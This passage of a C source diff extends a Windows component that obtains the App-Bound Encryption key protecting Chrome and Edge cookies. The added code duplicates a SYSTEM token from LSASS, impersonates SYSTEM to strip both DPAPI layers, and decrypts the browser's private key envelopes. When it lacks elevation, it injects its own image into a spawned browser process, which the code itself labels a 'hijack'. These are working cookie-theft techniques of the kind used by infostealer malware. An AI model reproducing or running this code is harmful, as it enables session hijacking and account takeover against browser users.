+    for (i = 0; i < ZP_ABE_KEY_SIZE; i++)
+    {
+        Derived[i] ^= ZpAbeV3Mask[i];
+    }
+    /* Envelope: version[1] + cng_block[32] + nonce[12] + ciphertext[32] + tag[16] */
+    Status = ZpAbeAeadOpen(BCRYPT_AES_ALGORITHM,
+                           BCRYPT_CHAIN_MODE_GCM,
+                           Derived,
+                           Envelope + 33,
+                           Envelope + 45,
+                           32,
+                           Envelope + 77,
+                           Key);
+    RtlSecureZeroMemory(Derived, sizeof(Derived));
+    return NT_SUCCESS(Status);
+}
+
+/* innermost user-DPAPI payload: [u32 len][validation data][u32 len][payload];
+   legacy Edge carries a raw key, Chrome/Edge a private envelope V1/V2/V3 */
+static
+BOOLEAN
+ZpAbeUnwrapInnerPayload(
+    _In_ const ZP_ABE_BROWSER* Browser,
+    _In_reads_bytes_(Size) const BYTE* Data,
+    _In_ DWORD Size,
+    _In_ HANDLE SystemToken,
+    _Out_writes_bytes_(32) PBYTE Key,
+    _Out_ PLONG EnvelopeVersion)
+{
+    ULONG ValidationLength, PayloadLength;
+    const BYTE* Payload;
+    NTSTATUS Status;
+
+    if (Size < 8) return FALSE;
+    RtlCopyMemory(&ValidationLength, Data, sizeof(ValidationLength));
+    if (ValidationLength > Size - 8) return FALSE;
+    RtlCopyMemory(&PayloadLength, Data + 4 + ValidationLength, sizeof(PayloadLength));
+    Payload = Data + 8 + ValidationLength;
+    if (PayloadLength > Size - 8 - ValidationLength) return FALSE;
+
+    if (PayloadLength == ZP_ABE_V3_ENVELOPE_SIZE && Payload[0] == 3)
+    {
+        BOOLEAN Ok;
+
+        /* V3: the CNG unwrap must run as SYSTEM */
+        Status = PS_Impersonate(SystemToken);
+        if (!NT_SUCCESS(Status)) return FALSE;
+        Ok = ZpAbeV3Unwrap(Browser, Payload, Key);
+        Status = PS_Impersonate(NULL);
+        if (Ok && NT_SUCCESS(Status))
+        {
+            *EnvelopeVersion = 3;
+            return TRUE;
+        }
+        return FALSE;
+    }
+    if (PayloadLength == ZP_ABE_V12_ENVELOPE_SIZE && Payload[0] >= 1 && Payload[0] <= 2)
+    {
+        if (ZpAbeV1V2Unwrap(Payload[0], Payload, Key))
+        {
+            *EnvelopeVersion = (LONG)Payload[0];
+            return TRUE;
+        }
+        return FALSE;
+    }
+    if (PayloadLength == ZP_ABE_KEY_SIZE)
+    {
+        *EnvelopeVersion = 0;
+        RtlCopyMemory(Key, Payload, ZP_ABE_KEY_SIZE);
+        return TRUE;
+    }
+    return FALSE;
+}
+
+static
+BOOLEAN
+ZpAbeIsElevated(VOID)
+{
+    TOKEN_ELEVATION Elevation;
+    HANDLE Token;
+    ULONG Length;
+    NTSTATUS Status;
+
+    if (!NT_SUCCESS(NtOpenProcessToken(NtCurrentProcess(), TOKEN_QUERY, &Token)))
+    {
+        return FALSE;
+    }
+    Status = NtQueryInformationToken(Token,
+                                     TokenElevation,
+                                     &Elevation,
+                                     sizeof(Elevation),
+                                     &Length);
+    NtClose(Token);
+    return NT_SUCCESS(Status) && Elevation.TokenIsElevated != 0;
+}
+
+/* offline unwrap: strip "APPB", SYSTEM DPAPI layer, user DPAPI layer, then
+ * the private envelope (admin required; the SYSTEM token is duplicated from
+ * LSASS like the vendors' own importers do) */
+static
+BOOLEAN
+ZpAbeAcquireElevated(
+    _In_ const ZP_ABE_BROWSER* Browser,
+    _In_reads_bytes_(BlobLength) const BYTE* Blob,
+    _In_ ULONG BlobLength,
+    _Out_writes_bytes_(32) PBYTE Key,
+    _Out_ PLONG EnvelopeVersion)
+{
+    DATA_BLOB In, Out = { 0 }, Final = { 0 };
+    HANDLE SystemToken = NULL;
+    ULONG LsaProcessId;
+    BOOLEAN Ok = FALSE;
+
+    *EnvelopeVersion = 0;
+    if (!NT_SUCCESS(Sys_GetLsaProcessId(&LsaProcessId)) ||
+        !NT_SUCCESS(PS_DuplicateSystemToken(LsaProcessId, TokenImpersonation, &SystemToken)))
+    {
+        return FALSE;
+    }
+
+    /* layer 1: SYSTEM DPAPI */
+    In.pbData = (PBYTE)Blob + 4;
+    In.cbData = BlobLength - 4;
+    if (NT_SUCCESS(PS_Impersonate(SystemToken)))
+    {
+        if (!CryptUnprotectData(&In, NULL, NULL, NULL, NULL, 0, &Out))
+        {
+            PS_Impersonate(NULL);
+            goto _Exit;
+        }
+        if (!NT_SUCCESS(PS_Impersonate(NULL)))
+        {
+            goto _Exit;
+        }
+    } else
+    {
+        goto _Exit;
+    }
+
+    /* layer 2: user DPAPI, then unwrap the innermost structure */
+    In.pbData = Out.pbData;
+    In.cbData = Out.cbData;
+    if (CryptUnprotectData(&In, NULL, NULL, NULL, NULL, 0, &Final))
+    {
+        Ok = ZpAbeUnwrapInnerPayload(Browser, Final.pbData, Final.cbData, SystemToken, Key, EnvelopeVersion);
+        RtlSecureZeroMemory(Final.pbData, Final.cbData);
+    }
+    if (Out.pbData != NULL)
+    {
+        RtlSecureZeroMemory(Out.pbData, Out.cbData);
+        LocalFree(Out.pbData);
+    }
+    LocalFree(Final.pbData);
+
+_Exit:
+    NtClose(SystemToken);
+    return Ok;
+}
+
+/* ---- hijack (browser process) ---- */
 
 static
 NTSTATUS
 ZpAbeMapSelf(
     _In_ HANDLE Process,
-    _In_reads_bytes_(RequestLength) PVOID Request,
-    _In_ ULONG RequestLength,
+    _In_reads_bytes_(sizeof(ZP_ABE_REQUEST)) const ZP_ABE_REQUEST* Request,
     _Out_ PVOID* Mapped)
 {
     PBYTE Self = (PBYTE)GetModuleHandleW(NULL);
@@ -589,11 +928,11 @@ ZpAbeMapSelf(
             Reloc = (IMAGE_BASE_RELOCATION*)((PBYTE)Reloc + BlockSize);
         }
     }
-    if (NT_SUCCESS(Status) && RequestLength != 0)
+    if (NT_SUCCESS(Status))
     {
         RtlCopyMemory(Copy + ((ULONG64)(ULONG_PTR)&ZpAbe_Request - (ULONG64)(ULONG_PTR)Self),
                       Request,
-                      RequestLength);
+                      sizeof(*Request));
     }
     if (NT_SUCCESS(Status)) Status = NtWriteVirtualMemory(Process, Base, Copy, Size, NULL);
     if (NT_SUCCESS(Status))
@@ -640,7 +979,7 @@ static
 NTSTATUS
 ZpAbeRunAcquisition(
     _In_ PCWSTR Executable,
-    _In_ PVOID Request,
+    _In_ const ZP_ABE_REQUEST* Request,
     _Out_writes_bytes_(32) PBYTE Key,
     _Out_ PLONG Code)
 {
@@ -674,7 +1013,7 @@ ZpAbeRunAcquisition(
     }
     Process = ProcessInfo.hProcess;
     Thread = ProcessInfo.hThread;
-    Status = ZpAbeMapSelf(Process, Request, sizeof(ZP_ABE_REQUEST), &Mapped);
+    Status = ZpAbeMapSelf(Process, Request, &Mapped);
     if (NT_SUCCESS(Status))
     {
         CONTEXT Context;
@@ -759,15 +1098,13 @@ ZpAbeAcquireCookieKey(
     _Out_writes_bytes_(32) PBYTE Key,
     _Out_opt_ PULONG ResultCode)
 {
+    static ZP_ABE_REQUEST Request;      /* patched into the staging copy */
     ZP_ABE_CACHE_ENTRY* Entry;
     LARGE_INTEGER Timeout;
     WCHAR Executable[MAX_PATH], LocalState[MAX_PATH];
-    PVOID Request = NULL;
-    PBYTE Text = NULL;
     BYTE BlobHash[32];
-    SIZE_T RequestSize = sizeof(ZP_ABE_REQUEST), ZeroSize = 0;
-    ULONG Length = 0, Offset = 0, SpanLength = 0;
     LONG Code = (LONG)0x80004005L;
+    LONG Envelope = 0, Method = ZP_ABE_METHOD_HIJACK;
     NTSTATUS Status;
 
     if (ResultCode != NULL) *ResultCode = 0;
@@ -781,25 +1118,10 @@ ZpAbeAcquireCookieKey(
     }
     if (NT_SUCCESS(Status))
     {
-        Status = NtAllocateVirtualMemory(NtCurrentProcess(),
-                                         &Request,
-                                         0,
-                                         &RequestSize,
-                                         MEM_COMMIT | MEM_RESERVE,
-                                         PAGE_READWRITE);
+        Request.Browser = Browser;
+        Status = ZpAbeReadAppBoundBlob(LocalState, Request.Blob, &Request.BlobLength);
     }
-    if (NT_SUCCESS(Status))
-    {
-        ((PULONG)Request)[0] = Browser;
-        Text = (PBYTE)Request + FIELD_OFFSET(ZP_ABE_REQUEST, LocalState);
-        Status = ZpAbeReadFile(LocalState, Text, ZP_ABE_LOCAL_STATE_MAX, &Length);
-        if (NT_SUCCESS(Status)) ((PULONG)Request)[1] = Length;
-    }
-    if (NT_SUCCESS(Status) && !ZpAbeFindBlobSpan(Text, Length, &Offset, &SpanLength))
-    {
-        Status = STATUS_NOT_FOUND;
-    }
-    if (NT_SUCCESS(Status)) Status = ZpAbeHashSha256(Text + Offset, SpanLength, BlobHash);
+    if (NT_SUCCESS(Status)) Status = ZpAbeHashSha256(Request.Blob, Request.BlobLength, BlobHash);
 
     while (NT_SUCCESS(Status))
     {
@@ -835,21 +1157,39 @@ ZpAbeAcquireCookieKey(
         NtResetEvent(Entry->Changed, NULL);
         ZpAbeReleaseEntry(Entry);
 
-        /* leader: expensive phase outside the entry lock */
-        Status = ZpAbeRunAcquisition(Executable, Request, Key, &Code);
+        /* leader: expensive phase outside the entry lock; elevated clients
+         * prefer the offline unwrap, everything else hijacks the browser */
+        if (ZpAbeIsElevated() &&
+            ZpAbeAcquireElevated(&ZpAbeBrowsers[Browser],
+                                 Request.Blob,
+                                 Request.BlobLength,
+                                 Key,
+                                 &Envelope))
+        {
+            Status = STATUS_SUCCESS;
+            Code = 0;
+            Method = ZP_ABE_METHOD_ELEVATE;
+        } else
+        {
+            Envelope = 0;
+            Code = (LONG)0x80004005L;
+            Status = ZpAbeRunAcquisition(Executable, &Request, Key, &Code);
+            Method = ZP_ABE_METHOD_HIJACK;
+        }
 
         ZpAbeAcquireEntry(Entry);
         RtlSecureZeroMemory(Entry->Key, sizeof(Entry->Key));
         if (NT_SUCCESS(Status)) RtlCopyMemory(Entry->Key, Key, 32);
         Entry->Status = Status;
         Entry->Result = Code;
+        Entry->Method = Method;
+        Entry->Envelope = Envelope;
         Entry->State = NT_SUCCESS(Status) ? 2 : 3;
         Entry->RetryTime = NT_SUCCESS(Status) ? 0 : GetTickCount64() + ZP_ABE_FAILURE_RETRY_MS;
         NtSetEvent(Entry->Changed, NULL);
         ZpAbeReleaseEntry(Entry);
         break;
     }
-    if (Request != NULL) NtFreeVirtualMemory(NtCurrentProcess(), &Request, &ZeroSize, MEM_RELEASE);
     if (ResultCode != NULL) *ResultCode = (ULONG)Code;
     return Status;
 }
